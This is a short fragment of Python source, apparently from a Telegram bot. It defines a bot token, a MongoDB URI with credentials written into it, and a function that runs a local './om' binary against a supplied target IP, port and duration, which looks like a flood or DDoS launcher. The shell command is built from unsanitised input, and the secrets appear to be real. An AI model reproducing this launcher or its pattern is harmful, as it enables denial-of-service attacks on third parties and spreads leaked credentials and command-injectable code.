...
TOKEN = '7910026816:AAEFPLQCMI4C9-YhMvhBmqZ7DeYJkPCxvNs'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1001854296925
CHANNEL_ID = -1001854296925
error_channel_id = -1001854296925
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./om {target_ip} {target_port} {duration} 150")
